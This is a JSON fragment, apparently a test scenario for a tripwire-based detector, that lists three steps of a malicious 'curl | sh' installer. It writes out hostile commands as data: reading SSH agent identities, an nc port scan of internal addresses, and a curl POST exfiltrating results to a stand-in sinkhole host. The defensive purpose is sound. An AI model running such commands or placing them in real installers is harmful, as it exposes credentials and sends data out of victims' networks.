  "steps": [
    {
      "step_id": "touch_ssh_agent",
      "detail": "installer inspects the SSH agent socket for loaded identities",
      "phase": "install",
      "process_lineage": ["curl | sh"],
      "command": "ssh-add -L",
      "file_path": "$SSH_AUTH_SOCK",
      "tripwire": "ssh_agent_touch",
      "severity": "high"
    },
    {
      "step_id": "scan_ports",
      "detail": "installer scans internal RFC1918 targets for open ports",
      "phase": "install",
      "process_lineage": ["curl | sh"],
      "command": "nc -z 10.0.0.1 22 80 443",
      "network_target": "10.0.0.1/24",
      "network_protocol": "tcp",
      "tripwire": "port_scan",
      "severity": "critical"
    },
    {
      "step_id": "exfil_results",
      "detail": "installer posts the scan result to an exfil sinkhole",
      "phase": "install",
      "process_lineage": ["curl | sh"],
      "command": "curl -X POST https://sinkhole.zitpit.invalid/upload",
      "network_target": "sinkhole.zitpit.invalid",
      "network_protocol": "https",
      "tripwire": "exfil_attempt",
      "severity": "critical"
    }
  ]
